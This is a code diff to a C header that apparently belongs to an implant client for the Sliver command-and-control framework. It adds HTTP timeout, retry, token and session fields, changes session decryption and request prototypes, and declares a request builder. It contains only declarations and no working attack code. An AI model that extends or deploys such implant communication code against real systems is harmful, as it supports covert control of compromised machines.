@@ -180,11 +180,19 @@ typedef struct _HTTP_CONFIG {
 	PWEB_PROXY pProxyConfig;
 	LPSTR lpUserAgent;
 	BOOL DisableUpgradeHeader;
+	LPSTR lpAccessToken;
+	DWORD dwResolveTimeout;
+	DWORD dwConnectTimeout;
+	DWORD dwSendTimeout;
+	DWORD dwReceiveTimeout;
+	DWORD dwNumberOfAttemps;
 	LPSTR AdditionalHeaders[HeaderEnumEnd];
 } HTTP_CONFIG, *PHTTP_CONFIG;
 
 typedef struct _SLIVER_HTTP_CLIENT {
 	HTTP_CONFIG HttpConfig;
+	PHTTP_CLIENT pHttpClient;
+	CHAR szSessionID[33];
 	PBYTE pSessionKey;
 	DWORD cbSessionKey;
 	LPSTR lpHostName;
@@ -216,7 +224,6 @@ typedef enum {
 typedef struct _HTTP_CLIENT {
 	PURI pUri;
 	PHTTP_SESSION pHttpSession;
-	PWEB_PROXY pProxyConfig;
 	HINTERNET hConnection;
 } HTTP_CLIENT, *PHTTP_CLIENT;
 
@@ -249,7 +256,7 @@ HINTERNET SendRequest
 (
 	_In_ PHTTP_CLIENT This,
 	_In_ PHTTP_REQUEST pRequest,
-	_In_opt_ LPSTR lpContentType,
+	_In_ DWORD dwNumberOfAttemps,
 	_In_opt_ LPSTR lpData,
 	_In_opt_ DWORD cbData
 );
@@ -325,7 +332,6 @@ PBYTE SessionDecrypt
 	_In_ PSLIVER_HTTP_CLIENT pClient,
 	_In_ PBYTE pMessage,
 	_In_ DWORD cbMessage,
-	_In_ LPSTR lpServerMinisignPubKey,
 	_Out_ PDWORD pcbPlainText
 );
 
@@ -335,4 +341,13 @@ BOOL VerifySign
 	_In_ PBYTE pMessage,
 	_In_ DWORD cbMessage,
 	_In_ BOOL IsHashed
+);
+
+PHTTP_REQUEST CreateHttpRequest
+(
+	_In_ PHTTP_CONFIG pHttpConfig,
+	_In_ HttpMethod Method,
+	_In_ LPSTR lpContentType,
+	_In_ LPSTR lpData,
+	_In_ DWORD cbData
 );
